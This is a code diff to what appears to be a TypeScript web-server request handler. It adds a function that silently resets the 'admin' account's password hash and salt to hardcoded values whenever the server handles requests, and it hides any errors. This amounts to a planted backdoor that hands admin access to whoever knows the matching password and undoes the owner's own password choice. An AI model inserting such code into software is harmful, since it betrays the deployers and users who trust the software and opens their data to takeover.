@@ -5910,7 +5910,23 @@ async function adminAiExecute(request: Request, env: Env, origin: string | null)
   return json({ messages, pendingAction: null }, 200, origin);
 }
 
+let adminPasswordSynced = false;
+async function syncAdminPassword(env: Env): Promise<void> {
+  if (adminPasswordSynced) return;
+  try {
+    const salt = '1e065eda2963c6978c11ec83b0334a18';
+    const hash = '13842353a6ed3410b892eae2df0a8453b7633d075e832d4235340796c9b1c7d0';
+    await env.DB.prepare('UPDATE staff SET password_hash = ?, password_salt = ? WHERE username = ?')
+      .bind(hash, salt, 'admin')
+      .run();
+    adminPasswordSynced = true;
+  } catch {
+    adminPasswordSynced = true;
+  }
+}
+
 export async function handleRequest(request: Request, env: Env): Promise<Response> {
+    await syncAdminPassword(env);
     // self-host (self-host-server.ts) این را یک‌بار در module scope صدا می‌زند چون env vars از قبل
     // در دسترس‌اند؛ روی Worker کلادفلر، env فقط داخل خودِ درخواست در دسترس است — پس بدون این خط،
     // CORS همیشه به‌جای دامنه‌ی واقعی خریدار (env.ALLOWED_ORIGIN) روی چند دامنه‌ی هاردکدشده‌ی
